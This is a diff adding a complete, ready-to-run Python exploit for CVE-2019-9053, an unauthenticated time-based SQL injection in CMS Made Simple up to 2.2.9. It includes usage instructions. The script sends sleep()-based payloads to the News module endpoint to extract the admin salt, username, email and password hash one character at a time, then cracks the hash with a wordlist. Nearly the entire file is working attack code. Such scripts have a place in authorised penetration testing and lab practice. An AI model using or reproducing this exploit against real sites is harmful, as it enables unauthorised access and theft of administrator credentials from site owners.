@@ -1,0 +1,228 @@
+#!/usr/bin/env python
+# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
+# Date: 06-19-2025
+# Exploit Author: Daniele Scanu @ Certimeter Group
+# Updated Author: Adrian Crowther @pointnext
+# Vendor Homepage: https://www.cmsmadesimple.org/
+# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
+# Version: <= 2.2.9
+# Tested on: Kali Linux 2025.2 Release
+# CVE : CVE-2019-9053
+
+import requests
+from termcolor import colored
+import time
+from termcolor import cprint
+import argparse
+import hashlib
+import sys
+
+parser = argparse.ArgumentParser()
+parser.add_argument('-u', '--url', action="store", dest="url", help="Base target uri (ex. http://10.10.10.100/cms)")
+parser.add_argument('-w', '--wordlist', action="store", dest="wordlist", help="Wordlist for crack admin password")
+parser.add_argument('-c', '--crack', action="store_true", dest="cracking", help="Crack password with wordlist", default=False)
+
+args = parser.parse_args() 
+if not args.url:
+    print("[+] Specify a url target")
+    print("[+] Example usage (no cracking password): exploit.py -u http://target-uri")
+    print("[+] Example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist")
+    print("[+] Setup the variable TIME with an appropriate time, because this sql injection is a time based.")
+    exit()
+
+url_vuln = args.url + '/moduleinterface.php?mact=News,m1_,default,0'
+session = requests.Session()
+dictionary = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$'
+flag = True
+password = ""
+temp_password = ""
+TIME = 1
+db_name = ""
+output = ""
+email = ""
+
+salt = ''
+wordlist = ""
+if args.wordlist:
+    wordlist += args.wordlist
+
+def crack_password():
+    global password
+    global output
+    global wordlist
+    global salt
+    try:
+        with open(wordlist, 'r') as dict_file:
+            for line in dict_file:
+                line = line.strip()
+                beautify_print_try(line)
+                hashed_guess = hashlib.md5((salt + line).encode('utf-8')).hexdigest()
+                if hashed_guess == password:
+                    output += "\n[+] Password cracked: " + line
+                    # Final print before exiting the loop
+                    beautify_print() 
+                    break
+    except FileNotFoundError:
+        print(f"\n[-] Wordlist not found at: {wordlist}")
+        exit()
+    except Exception as e:
+        print(f"\n[-] An error occurred while cracking: {e}")
+        exit()
+
+def beautify_print_try(value):
+    global output
+    sys.stdout.write("\033c") 
+    sys.stdout.flush()
+    cprint(output, 'green', attrs=['bold'])
+    cprint('[*] Try: ' + value, 'red', attrs=['bold'])
+
+def beautify_print():
+    global output
+    # FIX: Use sys.stdout.write and flush here as well
+    sys.stdout.write("\033c")
+    sys.stdout.flush()
+    cprint(output,'green', attrs=['bold'])
+
+def dump_salt():
+    global flag
+    global salt
+    global output
+    ord_salt = ""
+    ord_salt_temp = ""
+    output += "[+] Dumping Salt..."
+    beautify_print()
+
+    while flag:
+        flag = False
+        for char in dictionary:
+            temp_salt = salt + char
+            ord_salt_temp = ord_salt + hex(ord(char))[2:]
+            beautify_print_try(temp_salt)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_siteprefs+where+sitepref_value+like+0x" + ord_salt_temp + "25+and+sitepref_name+like+0x736974656d61736b)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            try:
+                r = session.get(url, timeout=TIME+2)
+            except requests.exceptions.ReadTimeout:
+                # This is expected for a successful time-based injection
+                pass
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            salt = temp_salt
+            ord_salt = ord_salt_temp
+    flag = True
+    output = '[+] Salt for password found: ' + salt
+
+def dump_password():
+    global flag
+    global password
+    global output
+    ord_password = ""
+    ord_password_temp = ""
+    output += '\n[+] Dumping Password Hash...'
+    beautify_print()
+    
+    while flag:
+        flag = False
+        for char in dictionary:
+            temp_password = password + char
+            ord_password_temp = ord_password + hex(ord(char))[2:]
+            beautify_print_try(temp_password)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
+            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            try:
+                r = session.get(url, timeout=TIME+2)
+            except requests.exceptions.ReadTimeout:
+                pass
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            password = temp_password
+            ord_password = ord_password_temp
+    flag = True
+    output += '\n[+] Password hash found: ' + password
+
+def dump_username():
+    global flag
+    global db_name # Note: this variable is misnamed, it holds the username
+    global output
+    ord_db_name = ""
+    ord_db_name_temp = ""
+    output += '\n[+] Dumping Username...'
+    beautify_print()
+    
+    while flag:
+        flag = False
+        for char in dictionary:
+            temp_db_name = db_name + char
+            ord_db_name_temp = ord_db_name + hex(ord(char))[2:]
+            beautify_print_try(temp_db_name)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+username+like+0x" + ord_db_name_temp + "25+and+user_id+like+0x31)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            try:
+                r = session.get(url, timeout=TIME+2)
+            except requests.exceptions.ReadTimeout:
+                pass
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            db_name = temp_db_name
+            ord_db_name = ord_db_name_temp
+    output += '\n[+] Username found: ' + db_name
+    flag = True
+
+def dump_email():
+    global flag
+    global email
+    global output
+    ord_email = ""
+    ord_email_temp = ""
+    output += '\n[+] Dumping Email...'
+    beautify_print()
+    
+    while flag:
+        flag = False
+        for char in dictionary:
+            temp_email = email + char
+            ord_email_temp = ord_email + hex(ord(char))[2:]
+            beautify_print_try(temp_email)
+            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users+where+email+like+0x" + ord_email_temp + "25+and+user_id+like+0x31)+--+"
+            url = url_vuln + "&m1_idlist=" + payload
+            start_time = time.time()
+            try:
+                r = session.get(url, timeout=TIME+2)
+            except requests.exceptions.ReadTimeout:
+                pass
+            elapsed_time = time.time() - start_time
+            if elapsed_time >= TIME:
+                flag = True
+                break
+        if flag:
+            email = temp_email
+            ord_email = ord_email_temp
+    output += '\n[+] Email found: ' + email
+    flag = True
+
+# --- Main execution flow ---
+dump_salt()
+dump_username()
+dump_email()
+dump_password()
+
+if args.cracking:
+    print(colored("\n[*] Now trying to crack password...", 'yellow'))
+    crack_password()
+
+beautify_print()
+# Add a final print to ensure the cursor is on a new line
+print()
